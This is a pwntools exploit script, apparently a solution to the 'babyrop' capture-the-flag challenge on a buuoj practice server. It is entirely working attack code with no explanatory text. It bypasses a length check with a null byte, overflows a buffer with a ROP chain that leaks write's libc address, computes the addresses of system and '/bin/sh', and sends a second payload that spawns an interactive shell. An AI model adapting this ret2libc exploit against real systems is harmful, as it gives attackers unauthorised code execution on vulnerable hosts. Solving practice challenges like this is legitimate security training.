from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 25522)
# io = process('./babyrop')
e = ELF('./babyrop')
io.sendline(b'\x00'.ljust(8, b'\xff'))
write_plt = e.plt['write']
write_got = e.got['write']
main_address = 0x8048825
payload = b'a'*0xe7 + b'pwn!'
payload += flat(write_plt, main_address, 1, write_got, 4)
io.sendlineafter(b'Correct\n', payload)
write_address = u32(io.recv(4))
log.success('write_address => 0x%x', write_address)
libc = ELF('./libc-2.23.so')
libcbase = write_address - libc.symbols['write']
info('libcbase_address => 0x%x', libcbase)
system_address = libcbase + libc.symbols['system']
log.success('system_address => 0x%x', system_address)
bin_sh_address = libcbase + libc.search(b'/bin/sh').__next__()
log.success('bin_sh_address => 0x%x', bin_sh_address)
io.sendline(b'\x00'.ljust(8, b'\xff'))
payload = b'a'*0xe7 + b'pwn!'
payload += flat(system_address, 0xdeadbeef, bin_sh_address)
io.sendlineafter(b'Correct\n', payload)
io.interactive()